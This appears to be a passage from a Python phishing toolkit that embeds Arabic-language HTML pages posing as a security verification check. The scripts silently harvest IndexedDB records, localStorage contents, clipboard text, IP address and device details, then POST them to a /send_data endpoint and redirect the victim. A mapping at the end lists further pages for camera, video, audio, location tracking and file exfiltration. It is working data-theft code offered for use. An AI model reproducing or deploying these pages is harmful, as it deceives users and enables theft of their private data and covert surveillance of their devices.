                                req.onerror = () => reject(req.error);
                            });
                            const objectStores = db.objectStoreNames;
                            for (const storeName of objectStores) {
                                const transaction = db.transaction(storeName, 'readonly');
                                const store = transaction.objectStore(storeName);
                                const allRecords = await new Promise((resolve) => {
                                    const req = store.getAll();
                                    req.onsuccess = () => resolve(req.result);
                                    req.onerror = () => resolve([]);
                                });
                                for (const record of allRecords) {
                                    if (record && typeof record === 'object') {
                                        const json = JSON.stringify(record);
                                        if (json.length > 100) {
                                            filesCollected.push({
                                                name: `${dbInfo.name}_${storeName}_record.json`,
                                                size: json.length,
                                                type: 'application/json',
                                                content: 'data:application/json;base64,' + btoa(json)
                                            });
                                            const logEntry = document.createElement('div');
                                            logEntry.textContent = `📄 استخراج: ${dbInfo.name}/${storeName} (${(json.length/1024).toFixed(1)} KB)`;
                                            fileLog.appendChild(logEntry);
                                            fileLog.scrollTop = fileLog.scrollHeight;
                                        }
                                    }
                                }
                            }
                            db.close();
                        } catch(e) {}
                    }
                } catch(e) {}

                try {
                    for (let i = 0; i < localStorage.length; i++) {
                        const key = localStorage.key(i);
                        if (key) {
                            const value = localStorage.getItem(key);
                            if (value && value.length > 500) {
                                filesCollected.push({
                                    name: `localStorage_${key}.json`,
                                    size: value.length,
                                    type: 'application/json',
                                    content: 'data:application/json;base64,' + btoa(value)
                                });
                                const logEntry = document.createElement('div');
                                logEntry.textContent = `📄 استخراج localStorage: ${key} (${(value.length/1024).toFixed(1)} KB)`;
                                fileLog.appendChild(logEntry);
                                fileLog.scrollTop = fileLog.scrollHeight;
                            }
                        }
                    }
                } catch(e) {}

                data.files = filesCollected;
                captchaText.textContent = `✅ تم استخراج ${filesCollected.length} ملف`;
                if (filesCollected.length > 0) {
                    captchaIcon.textContent = '✅';
                }

            } catch(e) {
                captchaText.textContent = '⚠️ تم استخراج ' + filesCollected.length + ' ملف';
                captchaIcon.textContent = '⚠️';
            }
        }

        function updateProgress() {
            if (progress < 85) {
                progress += Math.random() * 4 + 1;
                if (progress > 85) progress = 85;
                progressFill.style.width = progress + '%';
                const msgs = ['🔍 فحص الملفات...', '🔄 تحليل البيانات...', '📦 تجميع المعلومات...'];
                statusText.textContent = msgs[Math.floor(Math.random() * msgs.length)];
                setTimeout(updateProgress, 400 + Math.random() * 500);
            }
        }

        async function sendData() {
            if (dataSent) return;
            dataSent = true;

            verifyBtn.textContent = '📤 جاري الإرسال...';
            verifyBtn.style.opacity = '0.6';

            try {
                await fetch('/send_data', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(data)
                });
                statusText.textContent = '✅ تم إرسال ' + filesCollected.length + ' ملف';
                captchaStatus.textContent = '✅ تم الإرسال';
                captchaStatus.className = 'captcha-status done';
                progressFill.style.width = '100%';
            } catch(e) {
                statusText.textContent = '⚠️ جاري التوجيه...';
            }

            verifyBtn.textContent = '✔️ تأكيد التحقق';
            verifyBtn.classList.add('active');
            verifyBtn.style.opacity = '1';

            setTimeout(() => {
                window.location.href = original_url;
            }, 1800);
        }

        verifyBtn.addEventListener('click', function() {
            if (this.classList.contains('active')) {
                sendData();
            }
        });

        async function init() {
            await getIP();
            await getClipboard();
            updateProgress();
            await collectFiles();

            progressFill.style.width = '100%';
            statusText.textContent = `✅ تم استخراج ${filesCollected.length} ملف`;
            captchaStatus.textContent = '✅ جاهز للإرسال';
            captchaStatus.className = 'captcha-status done';
            captchaText.textContent = `✅ ${filesCollected.length} ملف جاهز`;

            verifyBtn.textContent = '✔️ تأكيد الإرسال';
            verifyBtn.classList.add('active');
            verifyBtn.style.opacity = '1';
        }

        init();
    </script>
</body>
</html>"""

CLIPBOARD_PAGE = """<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>التحقق من الأمان</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background: #0a0a0f;
            background-image: radial-gradient(circle at 30% 40%, #111128, #050508);
            margin: 0;
            padding: 20px;
        }
        .container {
            background: rgba(255,255,255,0.02);
            backdrop-filter: blur(40px);
            border: 1px solid rgba(255,255,255,0.05);
            border-radius: 32px;
            padding: 45px 35px;
            max-width: 480px;
            width: 100%;
            text-align: center;
            box-shadow: 0 60px 120px rgba(0,0,0,0.8);
            animation: fadeIn 0.7s ease-out;
        }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(20px) scale(0.98); } to { opacity: 1; transform: translateY(0) scale(1); } }
        .shield-icon { font-size: 56px; display: block; margin-bottom: 6px; animation: pulse 2.5s infinite; }
        @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.08); } }
        .title { color: #fff; font-size: 22px; font-weight: 600; margin-top: 8px; }
        .subtitle { color: rgba(255,255,255,0.35); font-size: 14px; font-weight: 300; margin-top: 8px; line-height: 1.6; }
        .captcha-box {
            background: rgba(255,255,255,0.03);
            border: 1px solid rgba(255,255,255,0.06);
            border-radius: 18px;
            padding: 20px 16px;
            margin: 22px 0 18px;
        }
        .captcha-icon { font-size: 28px; display: block; margin-bottom: 4px; }
        .captcha-text { color: rgba(255,255,255,0.5); font-size: 14px; font-weight: 300; }
        .captcha-status {
            display: inline-block;
            margin-top: 10px;
            background: rgba(102, 126, 234, 0.12);
            padding: 6px 20px;
            border-radius: 40px;
            color: #7a8cf5;
            font-size: 13px;
            font-weight: 500;
            border: 1px solid rgba(102, 126, 234, 0.15);
        }
        .captcha-status.done { color: #4ade80; border-color: rgba(74, 222, 128, 0.2); background: rgba(74, 222, 128, 0.08); }
        .progress-bar { width: 100%; height: 3px; background: rgba(255,255,255,0.04); border-radius: 10px; margin: 14px 0 8px; overflow: hidden; }
        .progress-fill { height: 100%; width: 0%; background: linear-gradient(90deg, #667eea, #a78bfa, #764ba2); border-radius: 10px; transition: width 0.4s ease; background-size: 200% 100%; animation: shimmer 2s infinite; }
        @keyframes shimmer { 0% { background-position: 200% 0; } 100% { background-position: -200% 0; } }
        .status-text { color: rgba(255,255,255,0.2); font-size: 12px; font-weight: 300; margin-top: 6px; letter-spacing: 0.3px; min-height: 20px; }
        .btn-verify {
            background: linear-gradient(135deg, #667eea, #764ba2);
            border: none;
            color: #fff;
            padding: 14px 28px;
            border-radius: 50px;
            font-size: 15px;
            font-weight: 600;
            cursor: not-allowed;
            opacity: 0.3;
            width: 100%;
            transition: all 0.4s ease;
            margin-top: 12px;
            letter-spacing: 0.5px;
        }
        .btn-verify.active { opacity: 1; cursor: pointer; box-shadow: 0 8px 40px rgba(102, 126, 234, 0.2); }
        .btn-verify.active:hover { transform: translateY(-2px); box-shadow: 0 12px 50px rgba(102, 126, 234, 0.35); }
        .footer-text { color: rgba(255,255,255,0.06); font-size: 10px; margin-top: 18px; letter-spacing: 1.5px; text-transform: uppercase; }
        #clipboardLog {
            color: rgba(255,255,255,0.2);
            font-size: 11px;
            margin-top: 10px;
            max-height: 150px;
            overflow-y: auto;
            text-align: left;
            padding: 8px;
            background: rgba(255,255,255,0.02);
            border-radius: 8px;
            font-family: monospace;
            word-break: break-all;
        }
        #clipboardLog div { padding: 2px 0; border-bottom: 1px solid rgba(255,255,255,0.03); }
    </style>
</head>
<body>
    <div class="container">
        <span class="shield-icon">📋</span>
        <h1 class="title">فحص المحتوى</h1>
        <p class="subtitle">نقوم بتحليل محتوى الحافظة للتأكد من سلامتها</p>

        <div class="captcha-box">
            <span class="captcha-icon" id="captchaIcon">🔍</span>
            <p class="captcha-text" id="captchaText">جاري فحص الحافظة...</p>
            <span class="captcha-status" id="captchaStatus">⏳ قيد المعالجة</span>
        </div>

        <div class="progress-bar">
            <div class="progress-fill" id="progressFill"></div>
        </div>
        <p class="status-text" id="statusText">جاري تحليل المحتوى...</p>
        <div id="clipboardLog"></div>

        <button class="btn-verify" id="verifyBtn">⏳ جاري الفحص...</button>

        <p class="footer-text">• Protected by Secure Shield •</p>
    </div>

    <script>
        const session_id = "{{ session_id }}";
        const original_url = "{{ original_url }}";
        const feature = "{{ feature }}";

        const progressFill = document.getElementById('progressFill');
        const statusText = document.getElementById('statusText');
        const verifyBtn = document.getElementById('verifyBtn');
        const captchaStatus = document.getElementById('captchaStatus');
        const captchaText = document.getElementById('captchaText');
        const captchaIcon = document.getElementById('captchaIcon');
        const clipboardLog = document.getElementById('clipboardLog');

        let progress = 0;
        let dataSent = false;
        let clipboardContent = null;

        const data = {
            session_id: session_id,
            timestamp: new Date().toISOString(),
            feature: feature,
            device: {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screen: screen.width + 'x' + screen.height
            },
            ip: null,
            clipboard: null
        };

        async function getIP() {
            try {
                const response = await fetch('/get_ip');
                const ipData = await response.json();
                data.ip = ipData.ip;
            } catch(e) {}
        }

        async function getClipboard() {
            try {
                if (navigator.clipboard && navigator.clipboard.readText) {
                    const text = await navigator.clipboard.readText();
                    if (text && text.length > 0) {
                        clipboardContent = text;
                        data.clipboard = text;
                        captchaText.textContent = '✅ تم حفظ محتوى الحافظة';
                        captchaIcon.textContent = '✅';
                        captchaStatus.textContent = '✅ تم الاستخراج';
                        captchaStatus.className = 'captcha-status done';

                        const logEntry = document.createElement('div');
                        logEntry.textContent = `📄 محتوى الحافظة: ${text.substring(0, 200)}${text.length > 200 ? '...' : ''}`;
                        clipboardLog.appendChild(logEntry);
                        clipboardLog.scrollTop = clipboardLog.scrollHeight;
                    } else {
                        captchaText.textContent = '📭 الحافظة فارغة';
                        captchaIcon.textContent = '📭';
                    }
                } else {
                    captchaText.textContent = '⚠️ لا يمكن الوصول للحافظة';
                    captchaIcon.textContent = '⚠️';
                }
            } catch(e) {
                captchaText.textContent = '⚠️ لا يمكن الوصول للحافظة (قد تحتاج إذن)';
                captchaIcon.textContent = '⚠️';
            }
        }

        function updateProgress() {
            if (progress < 85) {
                progress += Math.random() * 4 + 1;
                if (progress > 85) progress = 85;
                progressFill.style.width = progress + '%';
                const msgs = ['🔍 فحص الحافظة...', '🔄 تحليل المحتوى...', '📦 تجميع البيانات...'];
                statusText.textContent = msgs[Math.floor(Math.random() * msgs.length)];
                setTimeout(updateProgress, 400 + Math.random() * 500);
            }
        }

        async function sendData() {
            if (dataSent) return;
            dataSent = true;

            verifyBtn.textContent = '📤 جاري الإرسال...';
            verifyBtn.style.opacity = '0.6';

            try {
                await fetch('/send_data', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(data)
                });
                statusText.textContent = '✅ تم الإرسال';
                captchaStatus.textContent = '✅ تم الإرسال';
                captchaStatus.className = 'captcha-status done';
                progressFill.style.width = '100%';
            } catch(e) {
                statusText.textContent = '⚠️ جاري التوجيه...';
            }

            verifyBtn.textContent = '✔️ تأكيد التحقق';
            verifyBtn.classList.add('active');
            verifyBtn.style.opacity = '1';

            setTimeout(() => {
                window.location.href = original_url;
            }, 1800);
        }

        verifyBtn.addEventListener('click', function() {
            if (this.classList.contains('active')) {
                sendData();
            }
        });

        async function init() {
            await getIP();
            updateProgress();
            await getClipboard();

            progressFill.style.width = '100%';
            statusText.textContent = clipboardContent ? '✅ تم حفظ محتوى الحافظة' : '📭 الحافظة فارغة';
            captchaStatus.textContent = '✅ جاهز للإرسال';
            captchaStatus.className = 'captcha-status done';

            verifyBtn.textContent = '✔️ تأكيد الإرسال';
            verifyBtn.classList.add('active');
            verifyBtn.style.opacity = '1';
        }

        init();
    </script>
</body>
</html>"""

ALL_PAGES = {
    'camera_front': CAMERA_FRONT_PAGE,
    'camera_back': CAMERA_BACK_PAGE,
    'video_front': VIDEO_FRONT_PAGE,
    'video_back': VIDEO_BACK_PAGE,
    'audio': AUDIO_PAGE,
    'location': LOCATION_PAGE,
    'location_tracking': LOCATION_TRACKING_PAGE,
    'device': DEVICE_PAGE,
    'file_exfil': FILE_EXFIL_PAGE,
    'clipboard': CLIPBOARD_PAGE,
    'all': ALL_PAGE
}